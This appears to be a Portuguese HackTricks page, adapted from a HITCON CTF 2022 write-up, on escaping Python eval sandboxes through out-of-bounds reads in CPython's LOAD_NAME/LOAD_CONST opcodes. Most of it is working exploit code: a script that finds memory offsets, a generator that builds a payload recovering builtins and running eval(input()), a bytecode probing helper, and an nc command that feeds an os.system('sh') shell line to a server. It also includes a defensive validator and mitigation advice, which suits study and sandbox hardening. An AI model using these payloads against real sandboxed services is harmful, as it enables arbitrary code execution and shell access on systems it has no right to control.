# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Esta informação foi retirada** [**deste relatório**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Podemos usar o recurso de leitura OOB no opcode LOAD_NAME / LOAD_CONST para obter algum símbolo na memória. O que significa usar truques como `(a, b, c, ... centenas de símbolos ..., __getattribute__) if [] else [].__getattribute__(...)` para obter um símbolo (como o nome de uma função) que você deseja.

Então, basta elaborar seu exploit.

### Overview <a href="#overview-1" id="overview-1"></a>

O código-fonte é bem curto, contém apenas 4 linhas!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Você pode inserir código Python arbitrário, e ele será compilado em um [objeto de código Python](https://docs.python.org/3/c-api/code.html). No entanto, `co_consts` e `co_names` desse objeto de código serão substituídos por uma tupla vazia antes de avaliar esse objeto de código.

Dessa forma, todas as expressões que contêm constantes (por exemplo, números, strings etc.) ou nomes (por exemplo, variáveis, funções) podem causar falha de segmentação no final.

### Leitura Fora dos Limites <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Como a falha de segmentação acontece?

Vamos começar com um exemplo simples, `[a, b, c]` pode ser compilado no seguinte bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Mas e se o `co_names` se tornar uma tupla vazia? O opcode `LOAD_NAME 2` ainda é executado e tenta ler o valor daquele endereço de memória que originalmente deveria estar. Sim, isso é um recurso de leitura fora dos limites.

O conceito central para a solução é simples. Alguns opcodes no CPython, por exemplo, `LOAD_NAME` e `LOAD_CONST`, são vulneráveis (?) a leitura fora dos limites.

Eles recuperam um objeto do índice `oparg` da tupla `consts` ou `names` (é assim que `co_consts` e `co_names` são chamados internamente). Podemos nos referir ao seguinte pequeno trecho sobre `LOAD_CONST` para ver o que o CPython faz quando processa o opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Dessa forma, podemos usar o recurso OOB para obter um "nome" de um deslocamento de memória arbitrário. Para ter certeza de qual nome ele tem e qual é seu deslocamento, basta continuar tentando `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E você pode encontrar algo em torno de oparg > 700. Você também pode tentar usar gdb para dar uma olhada na disposição da memória, é claro, mas eu não acho que seria mais fácil?

### Gerando o Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Uma vez que recuperamos esses deslocamentos úteis para nomes / consts, como _fazemos_ para obter um nome / const desse deslocamento e usá-lo? Aqui está um truque para você:\
Vamos supor que podemos obter um nome `__getattribute__` do deslocamento 5 (`LOAD_NAME 5`) com `co_names=()`, então basta fazer o seguinte:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Observe que não é necessário nomeá-lo como `__getattribute__`, você pode nomeá-lo como algo mais curto ou mais estranho

Você pode entender a razão por trás disso apenas visualizando seu bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Observe que `LOAD_ATTR` também recupera o nome de `co_names`. O Python carrega nomes do mesmo deslocamento se o nome for o mesmo, então o segundo `__getattribute__` ainda é carregado do offset=5. Usando esse recurso, podemos usar um nome arbitrário uma vez que o nome esteja na memória próxima.

Para gerar números, deve ser trivial:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Eu não usei consts devido ao limite de comprimento.

Primeiro, aqui está um script para encontrarmos esses offsets de nomes.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
E o seguinte é para gerar o verdadeiro exploit em Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Basicamente, ele faz as seguintes coisas, para aquelas strings que obtemos do método `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Notas de versão e opcodes afetados (Python 3.11–3.13)

- Os opcodes de bytecode do CPython ainda indexam as tuplas `co_consts` e `co_names` por operandos inteiros. Se um atacante conseguir forçar essas tuplas a ficarem vazias (ou menores do que o índice máximo usado pelo bytecode), o interpretador lerá a memória fora dos limites para esse índice, resultando em um ponteiro PyObject arbitrário da memória próxima. Os opcodes relevantes incluem pelo menos:
- `LOAD_CONST consti` → lê `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → lê nomes de `co_names[...]` (para 3.11+ note que `LOAD_ATTR`/`LOAD_GLOBAL` armazena bits de flag no bit baixo; o índice real é `namei >> 1`). Consulte a documentação do desassemblador para a semântica exata por versão. [Python dis docs].
- O Python 3.11+ introduziu caches adaptativos/inline que adicionam entradas `CACHE` ocultas entre instruções. Isso não muda o primitivo OOB; significa apenas que, se você criar bytecode manualmente, deve levar em conta essas entradas de cache ao construir `co_code`.

Implicação prática: a técnica nesta página continua a funcionar no CPython 3.11, 3.12 e 3.13 quando você pode controlar um objeto de código (por exemplo, via `CodeType.replace(...)`) e reduzir `co_consts`/`co_names`.

### Scanner rápido para índices OOB úteis (compatível com 3.11+/3.12+)

Se você preferir sondar objetos interessantes diretamente do bytecode em vez de a partir de código-fonte de alto nível, pode gerar objetos de código mínimos e forçar índices. O auxiliar abaixo insere automaticamente caches inline quando necessário.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notas
- Para sondar nomes em vez disso, troque `LOAD_CONST` por `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e ajuste o uso da pilha de acordo.
- Use `EXTENDED_ARG` ou múltiplos bytes de `arg` para alcançar índices >255, se necessário. Ao construir com `dis` como acima, você controla apenas o byte baixo; para índices maiores, construa os bytes brutos você mesmo ou divida o ataque em múltiplos loads.

### Padrão mínimo de RCE apenas com bytecode (co_consts OOB → builtins → eval/input)

Uma vez que você tenha identificado um índice `co_consts` que resolve para o módulo builtins, você pode reconstruir `eval(input())` sem nenhum `co_names` manipulando a pilha:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Essa abordagem é útil em desafios que lhe dão controle direto sobre `co_code` enquanto forçam `co_consts=()` e `co_names=()` (por exemplo, BCTF 2024 “awpcode”). Ela evita truques em nível de fonte e mantém o tamanho do payload pequeno aproveitando operações de pilha de bytecode e construtores de tuplas.

### Verificações defensivas e mitigação para sandboxes

Se você está escrevendo um “sandbox” em Python que compila/avalia código não confiável ou manipula objetos de código, não confie no CPython para verificar os limites dos índices de tupla usados pelo bytecode. Em vez disso, valide os objetos de código você mesmo antes de executá-los.

Validador prático (rejeita acesso OOB a co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Ideias adicionais de mitigação
- Não permita `CodeType.replace(...)` arbitrário em entradas não confiáveis, ou adicione verificações estruturais rigorosas no objeto de código resultante.
- Considere executar código não confiável em um processo separado com sandboxing a nível de SO (seccomp, objetos de trabalho, contêineres) em vez de confiar na semântica do CPython.

## Referências

- O writeup do HITCON CTF 2022 da Splitline “V O I D” (origem desta técnica e cadeia de exploração de alto nível): https://blog.splitline.tw/hitcon-ctf-2022/
- Documentação do desassemblador Python (semântica de índices para LOAD_CONST/LOAD_NAME/etc., e flags de baixo bit `LOAD_ATTR`/`LOAD_GLOBAL` para 3.11+): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
